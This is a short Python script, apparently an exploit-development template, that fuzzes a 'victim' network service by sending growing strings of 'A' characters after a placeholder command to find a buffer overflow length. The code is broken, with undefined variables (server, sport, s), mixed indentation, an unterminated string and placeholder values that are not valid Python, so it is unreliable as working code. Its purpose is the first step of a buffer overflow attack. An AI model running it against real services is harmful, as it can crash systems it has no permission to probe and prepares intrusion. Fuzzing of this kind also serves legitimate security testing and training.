#A fuzzer for finding the buffer legnth

import socket

victim_host = <Enter IP of victim>
victim_port = <Enter port of BOF>

for i in range(3000):
  FUZZ = 'A' * i
	establish = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection = establish.connect((server, sport))
	print(s.recv(1024))
	s.send(('<command> .' + FUZZ + '\r\n'))
	print(establish.recv(1024))
	print("Sending attack length ", len(FUZZ), 'to <command>)
	establish.send('EXIT\r\n')
	print(s.recv(1024))
s.close()
